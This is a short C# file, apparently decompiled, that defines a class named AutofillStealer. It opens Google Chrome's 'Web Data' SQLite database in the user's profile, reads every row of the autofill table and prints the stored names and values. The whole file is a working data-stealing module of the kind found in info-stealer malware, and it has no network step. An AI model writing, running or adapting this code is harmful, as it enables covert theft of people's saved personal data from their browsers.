using System;
using System.Data.SQLite;

namespace Modules
{
	// Token: 0x0200000C RID: 12
	public class AutofillStealer
	{
		// Token: 0x06000010 RID: 16 RVA: 0x00002E8C File Offset: 0x0000108C
		public void Run()
		{
			Console.WriteLine("[+] Executing Autofills");
			string text = Environment.GetEnvironmentVariable("localappdata") + "\\Google\\Chrome\\User Data" + "\\Default\\Web Data";
			SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + text + ";Version=3;");
			sqliteConnection.Open();
			SQLiteDataReader sqliteDataReader = new SQLiteCommand("SELECT * FROM autofill", sqliteConnection).ExecuteReader();
			while (sqliteDataReader.Read())
			{
				string text2 = sqliteDataReader["name"].ToString();
				string text3 = sqliteDataReader["value"].ToString();
				Console.WriteLine(text2, text3);
			}
		}
	}
}
